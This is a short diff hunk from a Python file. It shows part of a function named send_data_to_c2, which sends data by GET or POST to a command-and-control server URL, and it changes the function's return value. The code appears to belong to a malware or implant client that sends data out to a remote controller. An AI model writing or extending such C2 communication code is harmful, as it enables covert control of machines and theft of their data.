@@ -68,4 +68,4 @@ def send_data_to_c2(method, endpoint, data):
     elif method == "GET":
         response = requests.get(
             f"{c2_url}/{endpoint}", params=data, headers=headers)
-    return response.json()
+    return response
